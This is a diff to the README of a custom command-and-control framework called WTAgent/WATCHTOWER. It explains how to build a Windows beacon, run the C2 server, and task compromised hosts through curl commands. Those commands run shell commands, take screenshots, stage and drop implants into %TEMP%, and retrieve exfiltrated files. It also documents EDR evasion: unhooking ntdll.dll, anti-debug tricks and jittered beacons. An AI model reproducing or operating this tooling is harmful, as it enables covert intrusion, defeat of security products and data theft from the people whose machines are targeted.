@@ -3,155 +3,179 @@
 ## Architecture
 
 ```
-[Operator browser] ──── WATCHTOWER UI (port 443)
-                              │
-[WTAgent beacon]  ────── wt_c2_server.js (port 8443) ──── loot/ stage/
-                          Operator API (port 8444, localhost)
+[Operator browser]
+       │
+       ├── WATCHTOWER UI  (port 443)   — MeshCentral C2 panel + WTAgent panel
+       │                                  calls /op/* on port 8443
+       │
+       └── wt_c2_server.js (port 8443) — single HTTPS server:
+               /wta/*   Agent check-ins (encrypted, no token)
+               /op/*    Operator API (Bearer token required)
+                        loot/   exfil'd files
+                        stage/  files staged for agent download
 ```
 
 ---
 
-## 1. Generate TLS + RSA keys
+## 1. Build the agent (run once per engagement)
 
 ```bash
 cd WTAgent/
-
-# TLS cert for HTTPS C2 server
-openssl req -x509 -newkey rsa:2048 \
-  -keyout server.key -out server.crt \
-  -days 3650 -nodes \
-  -subj "/CN=WTC2"
-
-# RSA key pair for agent session key wrapping
-openssl genrsa -out agent_unwrap.key 2048
-openssl rsa -in agent_unwrap.key -pubout -out agent_unwrap_pub.pem
+./build.sh --url https://YOUR-C2-IP-OR-DOMAIN:8443
 ```
 
----
+This will:
+1. Generate TLS cert (`server.key`, `server.crt`) if not present
+2. Generate RSA-2048 key pair (`agent_unwrap.key`, `agent_unwrap_pub.pem`) if not present
+3. Patch `WTAgent.cs` with the correct C2 URL and RSA public key
+4. Compile to `bin/WTAgent.exe`
 
-## 2. Configure WTAgent.cs
-
-Edit `src/WTAgent.cs` — `Config` class:
-
-| Field | Description |
-|-------|-------------|
-| `C2_URL` | Your server IP/hostname + C2 port, e.g. `https://192.168.101.7:8443` |
-| `SERVER_PUBKEY` | Base64 body of `agent_unwrap_pub.pem` (remove `-----BEGIN/END PUBLIC KEY-----` and newlines) |
-| `SLEEP_BASE` / `SLEEP_JITTER` | Check-in interval in ms (default 5s ± 2s) |
-
----
-
-## 3. Compile the beacon
-
-```
-compile.bat
-```
-
-Output: `bin/WTAgent.exe`
-
-Requires .NET 4.5+ (ships with Windows 7+). For cross-compilation on Linux, use Mono:
+**If Mono is not installed** (compilation skipped on Linux):
 ```bash
-mcs -target:exe -platform:x86_64 -optimize+ \
-    -r:System.Windows.Forms.dll -r:System.Drawing.dll \
-    -out:bin/WTAgent.exe src/WTAgent.cs
+sudo apt-get install -y mono-mcs mono-complete
+./build.sh --url https://YOUR-C2-IP-OR-DOMAIN:8443
 ```
+
+Or compile on Windows — the patched source is saved to `src/WTAgent_patched.cs`:
+```
+csc /target:exe /platform:x64 /optimize+ /unsafe ^
+    /r:System.Windows.Forms.dll /r:System.Drawing.dll ^
+    /out:bin\WTAgent.exe src\WTAgent_patched.cs
+```
+
+> **Re-run `build.sh` each time the C2 IP/domain changes.** The URL is baked into the binary.
 
 ---
 
-## 4. Start the C2 server
+## 2. Start the C2 server
 
 ```bash
+cd WTAgent/
 node wt_c2_server.js --port 8443 --key server.key --cert server.crt
 ```
 
-Logs written to `wt_c2.log`.
+On startup the server prints your operator token:
+```
+[INFO] Operator token : <64-char hex token>
+[INFO] Token file     : wt_op_token.txt
+```
+
+The token is auto-generated once and saved to `wt_op_token.txt`. Keep it secret.
 
 ---
 
-## 5. Operator API (curl examples)
+## 3. Connect the WATCHTOWER UI
+
+1. Open the WATCHTOWER web panel
+2. Click **⚡ WTAGENT** in the toolbar
+3. Click **⚙ CFG** and enter:
+   - **C2 API URL**: `https://YOUR-C2-IP:8443`
+   - **Operator Token**: paste from `wt_op_token.txt`
+4. Click **SAVE** — the panel polls `/op/agents` every 5 seconds
+
+---
+
+## 4. Deploy the agent
+
+Copy `bin/WTAgent.exe` to the target and run it (as the engagement dictates).
+
+The agent will:
+1. Check for debuggers — long sleep if detected
+2. Unhook `ntdll.dll` (removes AV/EDR user-mode hooks)
+3. Generate a fresh AES-256 session key, wrap it with the server RSA key, register
+4. Enter beacon loop: check in every `SLEEP_BASE ± SLEEP_JITTER` ms
+
+---
+
+## 5. Operator API reference
+
+All requests require `Authorization: Bearer <token>` header.
 
 ```bash
-BASE=http://127.0.0.1:8444
+BASE=https://YOUR-C2-IP:8443
+TOK=$(cat wt_op_token.txt)
 
 # List agents
-curl $BASE/op/agents
+curl -sk $BASE/op/agents -H "Authorization: Bearer $TOK"
 
-# Queue a shell command
-curl -X POST $BASE/op/task/AGENTID \
-     -H 'Content-Type: application/json' \
+# Queue shell command
+curl -sk -X POST $BASE/op/task/AGENTID \
+     -H "Authorization: Bearer $TOK" \
+     -H "Content-Type: application/json" \
      -d '{"type":"shell","arg":"whoami /all"}'
 
-# Queue a screenshot
-curl -X POST $BASE/op/task/AGENTID \
+# Screenshot
+curl -sk -X POST $BASE/op/task/AGENTID \
+     -H "Authorization: Bearer $TOK" \
      -d '{"type":"screenshot"}'
 
-# Get results
-curl $BASE/op/results/AGENTID
+# Process list
+curl -sk -X POST $BASE/op/task/AGENTID \
+     -H "Authorization: Bearer $TOK" \
+     -d '{"type":"proclist"}'
 
-# Queue process list
-curl -X POST $BASE/op/task/AGENTID -d '{"type":"proclist"}'
+# Change sleep interval (ms)
+curl -sk -X POST $BASE/op/task/AGENTID \
+     -H "Authorization: Bearer $TOK" \
+     -d '{"type":"sleep","sleep":15000}'
 
-# Stage a file for agent download (agent uses type:"download",arg:"filename.exe")
-curl -X POST $BASE/op/stage/implant.exe --data-binary @implant.exe
+# Stage a file for agent download
+curl -sk -X POST $BASE/op/stage/implant.exe \
+     -H "Authorization: Bearer $TOK" \
+     --data-binary @implant.exe
+
+# Queue download task (agent writes to %TEMP%)
+curl -sk -X POST $BASE/op/task/AGENTID \
+     -H "Authorization: Bearer $TOK" \
+     -d '{"type":"download","arg":"implant.exe"}'
 
 # List exfil'd files
-curl $BASE/op/loot
+curl -sk $BASE/op/loot -H "Authorization: Bearer $TOK"
 
-# Download exfil'd file
-curl $BASE/op/loot/AGENTID_timestamp_file.jpg -o out.jpg
+# Get results
+curl -sk $BASE/op/results/AGENTID -H "Authorization: Bearer $TOK"
 
-# Change agent sleep interval (ms)
-curl -X POST $BASE/op/task/AGENTID -d '{"type":"sleep","sleep":10000}'
-
-# Kill agent (exit process)
-curl -X POST $BASE/op/task/AGENTID -d '{"type":"kill"}'
-
-# Self-delete agent exe
-curl -X POST $BASE/op/task/AGENTID -d '{"type":"selfdel"}'
+# Kill agent
+curl -sk -X POST $BASE/op/task/AGENTID \
+     -H "Authorization: Bearer $TOK" \
+     -d '{"type":"kill"}'
 ```
 
 ---
 
 ## 6. Kill switch
 
-Set the following registry value to immediately stop the agent on next check-in:
+Set a registry key on the target to stop the agent on its next check-in:
 
-```
-HKCU\Software\WTAgent\kill  (any type/value)
-```
-
-PowerShell:
 ```powershell
 New-ItemProperty -Path "HKCU:\Software\WTAgent" -Name "kill" -Value 1 -Force
 ```
 
 ---
 
-## Security Features
+## Security features
 
-### Anti-Debug
-Checked on startup and periodically during the beacon loop:
-- `IsDebuggerPresent()` — kernel32 flag
-- `CheckRemoteDebuggerPresent()` — remote debugger attach detection
-- `NtQueryInformationProcess(ProcessDebugPort)` — checks debug port
-- `NtQueryInformationProcess(ProcessDebugFlags)` — checks NoDebugInherit flag
-- **Timing check** — measures NOP loop duration; single-stepping inflates it above threshold
+| Feature | Detail |
+|---|---|
+| **Comms encryption** | AES-256-CBC + HMAC-SHA256 per agent; key wrapped with RSA-2048 OAEP on registration |
+| **Agent identification** | Agent ID sent in URL `?id=` parameter — O(1) server lookup, no brute-force |
+| **Operator auth** | Bearer token (64-char hex), HTTPS only, token stored in `wt_op_token.txt` |
+| **Anti-debug** | IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQuery DebugPort/Flags, timing check |
+| **EDR unhooking** | Overwrites `ntdll.dll` in-memory `.text` with clean disk copy on startup |
+| **Sleep jitter** | Check-in interval = `SLEEP_BASE ± SLEEP_JITTER` ms (default 5s ± 2s) |
+| **Kill switch** | Registry key `HKCU\Software\WTAgent\kill` exits agent on next check-in |
+| **Connection backoff** | After 5 consecutive failures, sleeps 60s before retrying |
 
-On detection: long sleep (not exit) to avoid "process died on debugger attach" tell.
+---
 
-### Unhooking
-On startup, overwrites the in-memory `.text` section of `ntdll.dll` with a clean copy read
-directly from `C:\Windows\System32\ntdll.dll`. This removes user-mode hooks placed by
-AV/EDR products (e.g. CrowdStrike, SentinelOne, Carbon Black) that intercept syscalls
-by patching `Nt*` function prologues.
+## Deploying on a new server
 
-### Encrypted Comms
-- **Session key**: 32-byte AES key + 32-byte HMAC key, generated fresh per agent run
-- **Key exchange**: session keys wrapped with server RSA-2048 public key (OAEP/SHA-256)
-  and sent once during registration
-- **Payload format**: `IV(16) || AES-256-CBC(plaintext) || HMAC-SHA256(IV+ciphertext)`
-- **TLS transport**: HTTPS with self-signed cert (agent accepts any cert to handle lab certs)
+```bash
+# Clone repo / copy WTAgent/ directory
+cd WTAgent/
+./build.sh --url https://NEW-SERVER-IP:8443
+node wt_c2_server.js --port 8443 --key server.key --cert server.crt
+```
 
-### Sleep Jitter
-Check-in interval = `SLEEP_BASE ± SLEEP_JITTER` (uniform random), configurable at runtime
-via `sleep` task type. Avoids regular beacon timing signatures.
+New TLS certs and RSA keys are generated automatically if not present.
+Each server gets its own key pair — agents built for one server won't work on another.
